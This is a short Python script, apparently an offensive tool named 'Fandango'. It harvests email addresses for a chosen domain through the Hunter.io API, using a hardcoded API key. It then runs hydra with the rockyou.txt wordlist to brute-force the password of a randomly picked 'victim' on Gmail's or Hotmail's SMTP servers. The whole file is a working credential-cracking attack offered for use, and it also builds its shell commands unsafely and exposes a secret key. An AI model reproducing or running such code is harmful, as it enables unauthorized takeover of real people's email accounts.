import random 
import subprocess
from pyhunter import PyHunter
import os


hunter = PyHunter('445311743868f0f65449f96297c78aa175ca16d3')




print("███████╗░█████╗░███╗░░██╗██████╗░░█████╗░███╗░░██╗░██████╗░░█████╗░")
print("██╔════╝██╔══██╗████╗░██║██╔══██╗██╔══██╗████╗░██║██╔════╝░██╔══██╗")
print("█████╗░░███████║██╔██╗██║██║░░██║███████║██╔██╗██║██║░░██╗░██║░░██║")
print("██╔══╝░░██╔══██║██║╚████║██║░░██║██╔══██║██║╚████║██║░░╚██╗██║░░██║")
print("██║░░░░░██║░░██║██║░╚███║██████╔╝██║░░██║██║░╚███║╚██████╔╝╚█████╔╝")
print("╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░░╚════╝░")
print("")
print("Dictionary Assisted Brute Forcer")
print("")
domain= input("Domain> ")
output= hunter.domain_search(domain)
stripped_output= output["emails"]
emails=[]
for element in stripped_output: 
    emails.append(element["value"])

print("Select Brute Forcer option:")
print("(1) Hotmail")
print("(2) Gmail")
choice= input("> ")

print("[-] Mailing services use brute-force protection algorithms, thus these attacks are unreliable.")
print("[+] Attempting to crack password...")


victim_mail= random.choice(emails)
path=os.path.dirname(os.path.abspath(__file__))+"/rockyou.txt"
if choice=="1":
    subprocess.run("sudo hydra -s 587 -S -v -V -l "+victim_mail+" -P "+path+" -e ns smtp.live.com smtp",shell=True)
elif choice=="2":
    subprocess.run("sudo hydra -s 465 -S -v -V -l "+victim_mail+" -P "+path+" -e ns smtp.gmail.com smtp",shell=True)



